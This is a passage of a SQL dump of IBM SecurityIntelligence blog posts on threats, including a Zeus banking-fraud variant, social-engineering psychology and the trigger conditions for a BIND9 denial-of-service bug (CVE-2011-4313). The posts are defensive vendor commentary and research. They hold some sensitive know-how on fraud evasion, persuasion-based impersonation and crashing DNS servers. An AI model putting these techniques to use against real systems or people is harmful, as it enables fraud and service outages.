attachments and Flash movies on a daily basis, the exploitation of vulnerabilities in these applications is highly successful and puts many organizations at risk. Adobe is planning to release security updates on Tuesday, Oct. 8, 2013. We recommend that users deploy these updates as soon as possible. For organizations concerned about zero-day exploits, we recommend considering the implementation of exploit prevention technologies.', '\'Adobe\', \'Employee Endpoints\', \'Remote-Access Trojan (RAT)\', \'Spear Phishing\', \'Targeted Attacks\', \'Zero-Day Exploit\'', 'https://securityintelligence.com/massive-adobe-breach-puts-organizations-at-risk-of-zero-day-exploits/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (582, 'Four Essential Layers to Protect Against Advanced Threats', 'Jim Brennan', '2013-10-2', 'First, while defense-in-depth might still be a useful a concept to talk about how to address sophisticated threats, it is also true that the defense-in-depth mindset is, in many ways, responsible for the massive over-deployment and fragmentation of various security technologies in many IT environments. IBM recently announced the close of the   and we are very excited to begin working with our new colleagues over the weeks and months ahead. While Trusteer established themselves in the web fraud and financial services space, today I want to expand on how Trusteer’s newest capability ( ), adds a critical component to IBM’s strategy for approaching the challenges associated with more sophisticated attackers and the designer malware they frequently employ during intrusions. Our strategy is to tackle the challenge associated with advanced threats from the perspective of network and endpoint protection, and to do so within the context of threat and security intelligence. These are the four layers to protect against advanced threats: A firewall is not an IPS.  Time after time when we see these appliances tested and run in live environments we see the performance and efficacy of these technologies start to dramatically slip when all of the different functionality is enabled.  If you think organizations don’t exist for the sake of being secure, but should be secure, then using technology that will either negatively impact network performance if fully enabled, or leave you vulnerable if practicality mandates you turn capabilities off, an IPS inside a firewall probably isn’t what you are looking for.  An IPS, everything else aside, basically needs the best, most extensible, protection engine, a way to enforce application policy and control and the ability to handle mutations and network evasions. With the acquisition of BigFix a few years ago IBM brought on a technology with an excellent set of capabilities around endpoint and configuration management and control, and Trusteer adds a critical capability around anti-malware.  While it’s possible to use virtual sandboxes that execute applications as a method of doing malware detection and rapid incident response, it is simply not practical to do malware prevention on the network.  With Trusteer Apex IBM adds leading anti-malware capabilities that relies on neither anti-virus and signatures (ineffective against designer malware), nor whitelisting and blacklisting (too difficult to manage and effectively maintain operationally).  Instead, Trusteer Apex profiles the behavior of all endpoint applications and web browsers and blocks deviations from that behavior, effectively disrupting the way malware is installed on target machines. Today, it is also not nearly enough to know what is going on within your own infrastructure. It is critical to also see all of that activity in the context of the broader threat landscape.  The X-Force team has evolved over the years as the threat landscape has changed and today we can offer customers comprehensive vulnerability research, IP reputation, the visibility of our Managed Security Services organization and with the addition of the excellent Trusteer research organization and insights they have into malware and endpoint activity we will be able to offer our clients the ability to put the activity they are seeing in their own organization in the context of the broader, global threat landscape. The glue that holds it all together.  It is critical to be able to integrate security telemetry from across the IT infrastructure and threat landscape and then use correlation and analytics to understand context more completely than ever before.  This is a space that has evolved a great deal over the last decade and one where IBM is aggressively innovating.  Earlier this year we introduced Security Intelligence with Big Data for the most sophisticated security and data analysts and this summer we announced QRadar Vulnerability Manager, which, for the first time, put vulnerability information (including application and database vulnerabilities) in the context of other security data in order to more effectively prioritize vulnerabilities that required immediate response and remediation while simultaneously excluding vulnerabilities that posed limited risk because access to them could be blocked by other methods and network controls or a patch was available and/or scheduled for deployment. While we agree that complete protection is impossible, thus making requirements associated with incident response and network forensics a necessity, more prevention can be done around advanced threats than is happening today.  Our strategy is to force an increasingly high bar around the types of attacks that can penetrate an IT environment and then provide the tools and intelligence required to respond to the threats that do get through.', '\'Advanced Threat Protection\', \'IBM\', \'Trusteer\'', 'https://securityintelligence.com/four-essential-layers-to-protect-against-advanced-threats/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (583, '6 Psychological Elements Behind Sophisticated Cyber Attacks', 'Chris Poulin', '2013-9-27', 'As the recently released   points out, social networks are a relatively new construct, and yet they’ve been incorporated as an extension of our real world presence; an additional sense used to communicate our thoughts, activities, locations and even feelings. And it’s an input sense as well, one where users can vet each other out through the tapestry they spin to define their personas online. The risk is that we don’t fully understand how to interpret the subtleties of interaction online in the same way our brains have adapted to analyzing non-verbal communication, such as body language,   and how we respond to cultural and paralinguistic elements. Despite these critical nuances in communications we grant trust to online personalities we’ve never met—and who may be deceased or completely fictitious. Users ignore their better judgment in favor of building a large network, with the status that comes with it, and the promise of   that are clearly too good to be true. Trust is the foundation of security. Systems trust users based on their authentication credentials; users trust systems based on their legitimacy (e.g., Amazon vs BargainClownShoes.com); users trust the links in each other’s email based on friendship and familiar email domains.  are intertwined: we allow ourselves to be influenced by those we trust, but we can also elicit trust by wielding influence skillfully. Case in point is the  , in which a security consultant created a fictional persona, Robin Sage, who was purportedly a cyber threat analyst for the U.S. Department of Defense. Robin had accounts on  ,  , and  , and those were used to create a network of professional “targets.” Most of her new connections worked for the U.S. military, government, or affiliated organizations. Despite the lack of hard evidence to corroborate Robin’s clearance, credentials, or even existence, the contacts shared information that revealed their email addresses, bank accounts, and even the location of secret military units. Robin was sent documents to review and offered speaking slots at conferences. There are a number of psychological elements that contributed to the success of the experiment, many of which have been outlined in  ,  : This is a simple principle with complex implications: people tend to form trust with those they’re attracted to, both physically and emotionally. Robin Sage’s picture shows the face of a pretty girl in her mid-twenties, in half profile, eyes turned directly to the camera, and with a hint of a smile. While not lewd in any sense, despite the picture having been lifted from a pornography-related site, Robin seems young and earnest in her appeal for assistance, yet one is left with the impression of a more sensual agenda and that Robin is about to walk away and encouraging you to follow her. People are motivated more by what others do than a perceived or even quantifiable benefit. For example, hotel guests are 26% more likely to reuse towels when told that the majority of guests comply with that request, than if simply told that reusing towels protects the environment (read more on the  ). The first few connections are the barrier; once Robin accumulated them, others in similar positions or organizations were quick to accept Robin’s connection request, particularly if they shared connection with others in Robin’s social network. Humans feel a sense of obligatory quid pro quo; when one person provides something to another—a gift or a favor, usually—the recipient feels indebted to return the act in kind. Cialdini noticed that Hari Krishnas used this principle by giving flowers to passers by in airports, eliciting higher donations than before they appealed to travelers’ sense of reciprocity—even though there was no social contract before the encounter. This tactic can be employed in social networking to compel a stranger to accept your connection request if you provide them with information, for example, and it can even work in reverse, by providing the expectation that you will be indebted to a potential connection if they accept your invitation. Those who joined Robin’s network may have expected a deeper relationship in return after providing help, information, and speaking opportunities. Most people stick with their original decisions despite information that supports changing their course. This is embodied in the  , which demonstrates that subjects who choose one door would not switch when given a chance, even when they were informed that the odds were in their favor to make a different choice. In social networking, once a contact is committed to a connection, they are hard pressed to Unfriend or otherwise break that link, and will continue to interact and assist that person. There are a couple of other principles of persuasion that may be employed in social networks, but weren’t necessarily a component of the Robin Sage experiment: Authority, whether real or perceived, elicits obedience in many people. The principle of authority is  , and movies take this to an extreme when an undercover cop intimidates her way into a high security area. This can be used in social networking, directly or indirectly, by invoking the name of someone important (e.g., “I was speaking with General Dempsey last week and he asked me to…”) or by fabricating personal credentials designed to impress the target. When invoking someone else’s authority, it’s important to make sure that person is difficult to contact, usually because they’re so high ranking that mere mortals don’t have access to them. Make sure they don’t have a social networking account. Rarity increases value. People want to be included in exclusive offers and often make poor choices under pressure. Think of all the commercials on TV with the call to action, “Limited quantities! Act now!”, or appealing to your sense of urgency: “Your online banking has been blocked!” Con men have known about psychological ploys for ages, through intuition instead of documented behavioral models, and we still fall for many of the same scams after centuries of victimization. It hasn’t gotten any better online, either: the Robin Sage experiment was successfully reincarnated under a different, but similar, persona by the co-founder of a dating and social dynamics instruction school. Three years after the original presentation, we appear to have learned not much at all. In the  , we look at the current state of social networking threats and the psychological factors of trust that contribute the success of exploits. Those attacks are shockingly effective in their current manifestations. I predict that they haven’t topped out yet in terms of sophistication; there’s plenty of room for improvement using the six key principles of influence. Before anyone accuses me of providing a primer or roadmap to optimize phishing  , realize that the principles have been widely known for almost 30 years. The bad guys already know about them. We, the defenders, the cavalry tasked to defend and protect the territory, property, and honor of our enterprises and compatriots, need to be armed for battles involving well honed psychological tactics.', '\'Cybersecurity\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Phishing\', \'Phishing Attack\', \'Social Media\'', 'https://securityintelligence.com/sophisticated-cyber-attacks-6-psychological-elements/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (584, '2016: The Year of the Mega Breach', 'Michelle Alvarez', '2017-3-29', '“Excuse me, are you aware of what’s happening right now? We’re facing 20 billion security events every day. DDoS campaigns, ransomware, malware attacks …” says a woman sternly to an associate in a recently aired   featuring Watson and IBM Security. She may have been an actor, but the question and the threats she described plague real-world organizations and their security operations teams daily.   IBM X-Force knows the difficulties organizations face when it comes to finding time to step back from day-to-day operations to look at the big security picture. Because of this, they may be left with many unanswered questions, such as: \n Fortunately,   takes the guesswork out of assessing the security threat landscape for organizations with the IBM X-Force Threat Intelligence Index. To form assessments regarding the threat landscape, X-Force researchers draw on numerous data sources to include both data from monitored security clients — billions of events per year from more than 8,000 client devices in more than 100 countries — and data derived from noncustomer assets, such as spam sensors and honeynets. The following key trends point to a continued need to focus on security fundamentals. For a closer look at the full cyberthreat landscape for 2016, download the complete  .', '\'Data Breach\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Security Breach\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/cyber-attacks-research-reveals-top-tactics-xforce/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (585, 'Keep It Simple, Stupid: The Zeus Version', 'Etay Maor', '2013-9-24', 'IBM’s Amit Klein blogged in 2013 about two malware families called   and Tilon and how they were going  . He said we are witnessing an interesting trend: Organizations are rolling out advanced malware   that force malware authors to drop some of their more advanced techniques and reuse older techniques that were abandoned years ago. The latest example of this trend is a Zeus variant that was detected by the IBM Security Trusteer research team this month. Using a unique HTML injection mechanism and static mule accounts, this malware is now targeting banks in Eastern Europe by covertly manipulating and performing transactions on the end user’s behalf. In the last couple of years, many organizations took note of the malware threat and deployed advanced malware detection systems. These new security solutions were familiar with all the latest tricks that malware authors had to offer and contained effective countermeasures. But malware authors (and their criminal clients) did not sit idly by while their attacks were detected and eliminated; they fought back. Here are just three examples of such cases, examining the original criminal threat, the banks’ countermeasure and the criminals’ response to the countermeasure. Cyber criminals use stolen user credentials to commit fraud from their own devices. Security solutions then start using device ID and device reputation techniques to identify criminal devices and logins not originating from the known end user’s device. In response, cyber criminals then use Remote Desktop Protocol (RDP) to connect to the victim’s device and commit the   from that trusted device. Device ID solutions see this as the legitimate client’s device and therefore do not generate an alert. Cyber criminals use automatic scripts that create a fraudulent transaction right after an infected user logs in to the account.   then start performing velocity tests to all transaction pages. If a transaction form is filled out in less than a second, it’s obviously not a human, and the transaction is challenged or declined. In response, cyber criminals create automatic scripts with a “slow-fill” function that fills out the transaction form in a humanlike way (characters are entered by the script with intervals of 0.1-2 seconds). Velocity tests view the automated script as human and do not generate an alert. Cyber criminals use HTML injections to display additional fields to victims, who fill them out and provide the attackers with more data. Security solutions then compare page input fields to determine if the user is submitting data the bank did not ask for. In response, cyber criminals use malware to inject full pages to the victim rather than alter the original bank page. Effectively, the user is unknowingly filling out a malware-generated page and not communicating with the bank’s website. The bank then only sees the fields expected and does not generate an alert. The IBM Security Trusteer research team recently identified a   variant that uses a rather curious method to overcome malware detection solutions. This particular variant targets an Eastern European bank, whose transaction form contains typical data fields such as the paying account, transaction amount, beneficiary account, beneficiary name, beneficiary address and a transaction title. An HTML injection is applied to the transaction page that changes the HTML form field names of the beneficiary account number, name, address and transaction data (while leaving the source account field names and transaction amount field names unchanged). This Zeus variant also injects mule account data with the correct field names instead of the altered fields. The victim fills in the transaction details (at the HTML level, the field names for some data are incorrect), submits the form and the bank receives a HTTP request for the transaction only with the correct fields that now specify a receiving mule account. To recap, the malware uses a hard-coded HTML injection (with static mule account information) to perform fraudulent transactions. This technique, though simple and generally uninvolved, offers two advantages over JavaScript (JS) HTML injection: Fewer “moving parts” (dynamic scripts) means tougher detection for antivirus and anti-malware solutions, and it works on browsers whose users disabled JS for security reasons. Simple and crude — but effective. Just as users, organizations and security solutions study and adapt to new threats, malware authors remain stealthy by  . IBM Security Trusteer Rapport can detect, mitigate and remove this and other Zeus variants from infected devices. In addition, IBM Security Trusteer Pinpoint Malware Detection can effectively identify and warn organizations of malware-infected devices that attempt to log in and conduct transactions with their website.', '\'Advanced Malware\', \'Cybercriminals\', \'Device ID\', \'HTML Injection\', \'Remote Desktop Protocol (RDP)\', \'Security Solutions\', \'Trojan\', \'Zeus\'', 'https://securityintelligence.com/keep-it-simple-stupid-the-zeus-version/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (586, 'The Pitfalls of Legacy Anti-Malware Solutions', 'Dana Tamir', '2013-9-17', 'Most security professionals agree that we can’t effectively stop malware by  , an approach used by most anti-malware applications. But what about other legacy anti-malware solutions such as behavior-based host-based intrusion detection systems (HIDS) or host-based intrusion prevention systems (HIPS)? The promise of the HIDS/HIPS solution was big: By monitoring system behavior and network traffic, these solutions would be able to determine which behavior is normal and which may indicate an attack. However, it turns out that this approach is not so easy. Defining the policies and rules that determine which behavior is “normal” and which indicates an attack is a very difficult and time-consuming task that requires deep understanding and expertise. As a result, most of the HIDS/HIPS rules and policies are not deterministic enough, which results in many false-positive alerts. HIDS/HIPS administrators have problems keeping false-positives to a minimum. In come cases, false-positives have become so annoying that the alerts are ignored because they are triggered far too often. If the alerts are ignored, what’s the point in having them? Of course, this dramatically hinders security efforts, and   should never let it get to this point. To minimize false-positives, it is necessary to constantly tune HIDS/HIPS rules and policies. Every time a new application is installed, updated or patched, the HIDS/HIPS solution must be retuned. This creates a huge burden on the solution administrators, who need to understand each alteration when it is triggered. It also increases the total cost of solution ownership. The cost of professional resources required for initial setup, ongoing maintenance, tuning and administration of the solution and training and user support drives the solution costs very high. False-positives are also very annoying to the end user. Most enterprise users are not security experts. They don’t understand — and often don’t care about — the security alerts that pop up on their screens. All they know is that these alerts are preventing them from doing their job. If this happens too often, users will demand that the solution is removed from their desktop, rendering it ineffective. Again, never let it get to this point. Thankfully, we’ve come a long way since the days of HIDS and HIPS solutions. Trying to determine that an action is malicious only by examining host behavior has proven to be an ineffective method because it lacks the context of the operation. Only by understanding both the application operation and its context is it possible to accurately determine whether the operation is valid. IBM Security provides a   that is accurate, effective, transparent to the user and requires a minimal investment of IT resources, so customers really do get the best of both worlds.', '\'Anti-Malware\', \'False Positives\', \'Malware\'', 'https://securityintelligence.com/the-pitfalls-of-legacy-anti-malware-solutions/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (587, 'Fake News: Syrian Crisis News Used to Spread Information-Stealing Malware', 'Dana Tamir', '2013-9-12', 'A new series of fake news campaigns is taking advantage of the heightened interest in the crisis in Syria and the possibility of a U.S. attack. The campaigns are used for spreading dangerous forms of advanced malware among users. Two email templates have been seen so far. The first email’s subject line refers to a fake news report from CNN declaring that “the United States began bombing!” The second email’s line says, “United States made ?the first surgical skes on Syria.” The misspellings in the email subject line and body should make users quickly realize that these emails are fake news and spam. The message body includes a picture and some text, followed by a link to the full story. The link directs the user to a legitimate website that has been compromised (known as a watering hole attack). A JavaScript code planted in the website exploits a known Java 7 Security Manager Bypass Vulnerability (CVE-2013-0422), for which a patch already exists. Here is an example of one of the emails: As a result of the  , a two-step download process installs three known information-stealing malware variants on the user’s machine. The first step downloads Fareit. The Trojan PWS Win32/Fareit variant is also known as the fake Adobe Flash Updater. Its purpose is to grab the victim’s credentials and download Zeus malware files from a remote host. In the second step, Fareit downloads the secondary  . IBM Trusteer solutions provide endpoint protection against these attacks and help prevent endpoint compromise.   applies exploit prevention technology to block the exploit and malware download and prevent endpoint compromise.   prevents the malware Trojans from executing and compromising the user endpoint.', '\'Advanced Malware\', \'Endpoint\', \'Endpoint Protection\', \'Exploit\', \'Gameover Zeus (GOZ)\', \'IBM Security\', \'Java\', \'JavaScript\', \'Malware\', \'Trusteer\', \'Zeus Malware\'', 'https://securityintelligence.com/fake-news-syrian-crisis-news-used-spread-information-stealing-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (588, '5 Gardening Tips to Improve your Vulnerability Management Program', 'Tim Appleby', '2013-8-29', 'I’m always gardening and looking for great plant deals at local nurseries or practical gardening tips in magazines and newspapers that I can apply to my garden, especially during these dog days of summer. Recently, as I was browsing the Saturday newspaper for ‘end of season discounts’ at local nurseries, I came across an article about ‘ ’ your garden as the end of the growing season approaches. As I was reading the article, I was intrigued by the similarities of these gardening tips with some common sense security practices you can apply to your infrastructure. Here’s a list of five gardening tips juxtaposed with my version of a ‘end of summer’ to-do list to tidy up you  . Judge for yourself: \n Taking proactive steps during these dog days of summer will provide just the encouragement you and your plants need to finish strong. This holds true for tidying up your vulnerability management program to ensure the security defenses are in place to protect the fruits of your labor.', '\'Security Information and Event Management (SIEM)\', \'Vulnerabilities\'', 'https://securityintelligence.com/5-gardening-tips-to-improve-your-vulnerability-management-program/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (589, 'How to Shield Targeted Applications from Malicious Exploits', 'Dana Tamir', '2013-8-28', 'When we discuss exploit prevention, we often talk about “targeted applications.” This term refers to end-user applications that can be exploited by hackers for malicious purposes. There are a few requirements that define these applications: In order to deliver the exploit, the attacker must be able to provide the user with specially crafted content that contains the malicious exploit, aka weaponized content. For example, this could be an HTML Web page that contains a hidden Java applet, or an email attachment, such as a Word document, Excel spreadsheet or PDF document, that contains hidden code. This code executes when the application opens the content and exploits vulnerabilities in these applications to download malware on the endpoint. If an application does not receive external content, it would be impossible for the attacker to deliver the weaponized content and the exploit. Vulnerable applications provide the attacker with an opportunity to develop an  . Some applications contain more vulnerabilities than others, and some vulnerabilities are easier to exploit. An application that has many exploitable vulnerabilities will be targeted more often.  , which are vulnerabilities that are unknown to the public, are more likely to be successfully exploited because there is no patch available. However, zero-day vulnerabilities are not a requirement. Interestingly, known application vulnerabilities are still exploited because many users do not apply security patches in a timely manner. Common applications that can be found on most user endpoints are targeted more often than uncommon, specialized applications. Of course, the more common the application is, the wider the attack surface it provides. Exploit code must be developed in order to exploit the application’s vulnerability. If the vulnerability exists but no exploit code was developed, the risk remains theoretical. Considering the listed requirements for targeted applications, it is not surprising that the most-targeted end-user applications are browsers, Java applications, Adobe Acrobat, Flash, Word, Excel, PowerPoint and Outlook. These are all common applications found on most user endpoints. They all receive external content that can be weaponized. They all contain vulnerabilities — most of them are known, but periodically, we hear about zero-day vulnerabilities. Also, exploit kits that contain exploit codes are widely available. If we take, for example, the 2011  , the attacker used a spear-phishing campaign to deliver a weaponized attachment to employees. The spear-phishing email included a weaponized Excel spreadsheet that contained a zero-day exploit object. The attachment exploited an Adobe Flash vulnerability (CVE-2011-0609) to silently install a customized remote access Trojan known as Poison Ivy RAT. Both Excel and Adobe Flash are commonly targeted applications that can be found on most user endpoints. Any   and exploit prevention technology must ensure these targeted end-user applications are not successfully exploited. Since these applications are very different from each other, special controls may be required for each application. For example, Java applications are vulnerable to both native exploits (executed at the memory level) and applicative exploits (executed in the user space by breaking out of the Java virtual machine sandbox). Solutions that apply granular controls at the OS level to protect against native exploits wouldn’t be able to protect against applicative exploits.', '\'Applications\'', 'https://securityintelligence.com/how-to-shield-targeted-applications-from-malicious-exploits/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (590, 'CVE-2011-4313: How to DOS BIND9 with Typical DNS Responses', 'Yong Chuan Koh', '2013-8-26', 'As I was looking through my old projects, I came across this old DOS vulnerability in BIND9:  . This caught my attention because rather than the typical case of parsing error from malformed fields, the root cause for this crash arises because of BIND9’s cache implementation for DNS responses whereby the previous responses can be abused. Since this was disclosed some time ago, I decided it is now appropriate to share some technicalities. The following code snippets are based on v9.7.1-P2, an affected version. The reader is assumed to be familiar with the DNS packet format. Before proceeding, we note that BIND9 stores DNS records in a similar manner: \n In a nutshell, each DNS record type is stored as a dns_rdata_t structure. Similar DNS record-types are then collectively grouped together and headed by a dns_rdataset_t structure. The dns_rdataset_t stores group information such as type, class, covers, etc. The rdatasetheader_t also stores similar information as dns_rdataset_t. Now we are all set to examine the vulnerability. First off, we looked at the official  : One advantage of working on open-source applications is the availability of, well, the source code. In query.c, the only function having the assertion is query_addadditional2(). \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n This function is called when BIND9 is crafting the A record in the ADDITIONAL section from the cache, for a subsequent query. Clearly, to trigger the assertion, dns_db_findrdataset() has to return DNS_R_NCACHENXRRSET with sigrdataset != NULL. So now we take a closer look at cache_findrdataset(), of which dns_db_findrdataset() is a wrapper of. \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n In this function, BIND9 walks the link-list to find the rdatasetheader and sigrdatasetheader for the target matchtype, negtype and sigmatchtype. The rdatasetheader and sigrdatasetheader are then “converted” to rdataset and “sigrdataset. Finally, if rdataset is a negative cache entry, then it returns DNS_R_NCACHENXRRSET if the RDATASET_ATTR_NXDOMAIN bit is not set. At this instance, we note that query_addadditional2() calls cache_findrdataset() with these arguments: To answer the first question, we note that BIND9 initializes the rdatasetheader->type value during the additional of records into cache, in addrdataset(). \n Which means that the record to be cached should have: The only way for rdataset->type == 0x00 is for BIND9 to cache a negative entry. This, again, verifies the advisory of “ ” \n \n \n \n \n \n \n \n \n \n \n As we follow the caller of addrdataset()/dns_ncache_addoptout(), we also see that rdataset->covers is determined by the DNS query type in resquery_response(). \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n The astute reader may have wondered about the impact of rdatasetheader->type having the RBTDB_RDATATYPE_NCACHEANY (0xFF0000) value in cache_findrdataset(). This would not trigger the assertion for 2 reasons: \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n The last piece to the puzzle is to find out how to link a RRSIG rdatasetheader to the negative-cached record. It turns out to be quite simple. For example, after receiving a “NS” response with an A record in the ADDITONAL section, and both “NS” and “A” have RRSIG records, the cache would look like this: \n rdatasetheader_1contains the RRSIG record for the “A” record in rdataheader_2. Similarly for rdatasetheader_3 and rdatasetheader_4. Recall that earlier, we’ve seen that the rdataset->type should be 0x01. Therefore, this has to be an “A” query with a negative response. An example of negative response would be one with no ANSWER records. Therefore subsequently, if BIND9 receives a negative response for an “A” query, then it would update “A” record in the list to a negative type without removing the original RRSIG record, as shown below:\n \n So there we have it; the conditions required to trigger the crash. In this state, when this BIND9 receives another “NS” query, it would look into its cache to form the response. This is the key to the problem. As it prepares the ADDITIONAL section in query_addadditional2(), rdataset_2 and rdataset_1 would be found and DNS_R_NCACHENXRRSET returned. Thus triggering the assertion. Implementation bugs like this are tricky to find because we need to know how the internals work. I hope everyone had as much fun looking at this vulnerability as I do. Lastly if anyone has any idea on how else to trigger this, drop me a note!', '\'BIND9\', \'IBM X-Force Research\', \'Vulnerabilities\'', 'https://securityintelligence.com/cve-2011-4313-how-to-dos-bind9-with-typical-dns-responses/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (591, 'Android 4.3 is Here! What Does it Mean for Security?', 'Nishad Herath', '2013-8-19', 'The latest iteration of the  , was unveiled by Google on the 24th of July. Factory firmware images with Android 4.3 (for Nexus devices) have already been made available for download by Google. It probably won’t be too long before various Android device manufacturers and careers follow suit with their own updates to existing devices. In the near future new devices sporting Android 4.3 Jelly Bean will undoubtedly become commonplace in the market. Let’s take a few minutes to examine the changes Android 4.3 Jelly Bean introduces from a security perspective. While ultimately, the specific nature of the Android 4.3 Jelly Bean firmware image from the device manufacturer (or career), including customizations, will determine the exact nature of the complete security environment for a particular device, the core Android platform security enhancements will still play a significant role. Needless to say,   includes fixes that address vulnerabilities discovered in the Android operating system (some of these fixes may also be backported to previous Android versions to support existing devices). Here however, we will focus on the new platform security enhancements rather than such fixes. One of the most significant security enhancements of the new Android release is that now, the Android application sandbox which restricts what an application can do on the system, thus mitigating the risk of potential damage to the entire system posed by malicious applications, is made even more robust by reinforcing it with the SELinux MAC (Mandatory Access Control) system implemented in the kernel. Google claims the integration with SELinux is invisible to the users and developers, even though as a safety precaution to ensure maximum compatibility with existing applications, the current release of Android will be enabling SELinux functionality only in a permissive mode, where any security policy violations are only recorded. On the Android operating system, like with Unix, file system setuid and setgid permissions are supported, which allow applications with specific setuid and setgid permissions to execute under the security context of the specified system user and group. Privileged programs have these permissions set, so that they could execute under elevated privileges. However, such programs over the years have often shown to be a preferred target for attack by hackers, seeking privilege escalation. Android 4.3 removes all such privileged setuid/setgid programs thus significantly reducing the available attack surface for privilege escalation by exploiting such a program. Furthermore, the latest release of Android removes an application’s ability to execute setuid programs, reducing the attack surface and attack opportunities further. Also Android 4.3 introduces what Google calls “Capability Bounding” which drops unnecessary capabilities (the ability of an application operating in a certain security context to perform certain tasks) when executing applications, such that applications launched from a GUI shell for example is unable to acquire privileged capabilities, again preventing privilege escalation attempts attempted this way. Also, applications are prevented from performing operations to escalate privileges via the execve() system call. In a bid to provide greater security for applications using cryptographic mechanisms internally, Android now provides the means for applications to create and securely store cryptographic keys used in such mechanisms, providing protection from other applications attempting to gain access to these keys. This enhances the protection available to legitimate applications against malicious applications (such as a rogue application the user might have downloaded from an app store without knowing it is malicious) attempting to steal cryptographic key material (belonging to applications such as financial applications or privacy applications, for example). Furthermore, Android 4.3 introduces the ability for applications to ensure cryptographic keys used system-wide are bound to the device hardware giving the applications a place to create and store cryptographic keys that are resilient against being extracted off the device, even in cases where the device itself “rooted” (i.e. highest privilege level access to the device is enabled). These changes improve the robustness of the Android operating system against malicious applications by restricting what a malicious application can do on the system further and also provides greater application isolation thus increasing protection legitimate applications may enjoy against malicious applications. However, there is likely to be significant impact upon privileged applications operating under higher privileges such as applications that only run on “rooted” devices. Additionally, built in mitigation technologies against the exploitation of memory corruption vulnerabilities are further improved, by implementing read only relocation sections for statically linked binary executables and by removing all text relocations from Android code. For non-ARM platforms such as x86 and MIPS, technology (FORTIFY_SOURCE) that can prevent some buffer overflow conditions (commonly exploited vulnerability class) is enabled for hardend string handling library routines. Last but not the least, there has been enthusiastic discussion on the web about a feature that some are considering a hidden feature, a new applications permissions manager (supposedly called “App Ops”) which allows fine grained application level permissions control. This allows users to restrict what an application can do (such as access the phone address book or the GPS location) any time rather than just being able to not install an application based on the permissions that application requires, which can be viewed prior to installing the application. This is very likely to be popular as this ability is very useful for users who are concerned about privacy implications of using certain applications. In summary, Android 4.3 “Jelly Bean” release appears to have introduced significant security enhancements to the Android platform that is likely to enhance device security and user privacy.', '\'Android\', \'Jelly Bean\', \'Mobile Security\', \'Technical & Product\', \'Vulnerabilities\'', 'https://securityintelligence.com/android-4-3-is-here-what-does-it-mean-for-security/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (592, 'The Key To Moving Application Security Forward', 'Diana Kelley', '2013-8-19', 'Surgeon Atul Gawande recently wrote about the phenomena of “ ” in  . In the article, Gawande explores why some great ideas move quickly and are adopted rapidly, while others lag and take years before they are generally accepted. Gawande starts off with two excellent examples from medicine in the 1800s: anesthesia and antisepsis. Anesthesia was first introduced by a doctor at Mass General Hospital in October 1846, a paper on anesthesia was published by another doctor “ .” And by the middle of December that year anesthesia was being used around the US and in Paris and London before spreading throughout the rest of Europe and the World. Nowadays with the instantaneous global reach of the Internet we’re used to memes like   and     girlfriend spreading worldwide in hours. But back in the 1800s to have an idea, especially one as risky as knocking patients out with ether, spread internationally in mere weeks is impressive. One could argue that great ideas are just so good that they’re bound to spread like wildfire. But Gawande’s second example, antisepsis, shows this isn’t always the case.   is the prevention of bacterial infection through the use of antiseptics. Back in the day surgeons wore coats stiffened with the blood of patients like a badge of honor. And they performed surgery wearing coats caked with previous patients’ blood while working on the next ones. If, like me, you were somewhat traumatized and revolted the first time you saw Eakins’ painting  , you know how far we’ve come. Today we’re used to sterile operation rooms and crisp white, freshly laundered lab coats. But the less than antiseptic conditions of the Gross Clinic was the standard for its time. In the 1860s, surgeon Joseph Lister became convinced that microorganisms were the underlying cause for patient wound sepsis and began to evangelize use of carbolic acid to cleanse hands, surgical instruments and wounds. But   even at Massachusetts General Hospital. Both anesthesia and antisepsis have clear benefits, but one is easier to adopt and provides more immediate benefits than the other. So while anesthesia was almost immediately accepted and adopted, antisepsis floundered and took a much slower path. Antisepsis required upfront work from the surgeon: extra time to clean the instruments, painful washing of their hands with burning carbolic acid. But it was adopted eventually. As more and more surgeons experimented with antiseptic operating environments, and reaped the benefit of having fewer patients become infected post-surgery, the word spread. Application security testing is a “ ” like antisepsis. The benefits are clear and measurable, but are not always immediately apparent. Deploying a vulnerable application may never have a repercussion if the vulnerability remains undiscovered or unexploited. But the work to build security into the software development lifecycle and perform testing is very apparent. Moreover, application security testing can seem like a deployment gate because it requires developers and security teams to not only test the software but also to take time to remediate or mitigate vulnerabilities before deployment. In the long run, having more robust applications is as important as having patients leave the surgery room without infection. But the resource investment upfront isn’t always matched by recognizably “better” products.   And there’s no guarantee they ever will be discovered or exploited. The key to driving adoption of ideas and procedures that don’t have an immediate, tangible benefit is  . Like the 1800s surgeons who practiced antisepsis and over time could prove a much lower infection rate in patients, today’s application development and security teams need to share their experiences with application security testing and the long-term benefits of building security in that they’ve experienced as a result. A number of people and groups in the EU are doing just that. They’re gathering, researching and sharing their experiences with application security and gaining adoption momentum. In August, the First European workshop on Web Application Security Research (WASR’13) will be co-located with the   conference in Hamburg, Germany. The International Standards Organization (ISO) has developed an   that has been adopted by many large organizations including  . And ENISA (European Network and Information Security Agency), which is leading the   has developed a set of    and is   in collaboration with OWASP. Here at 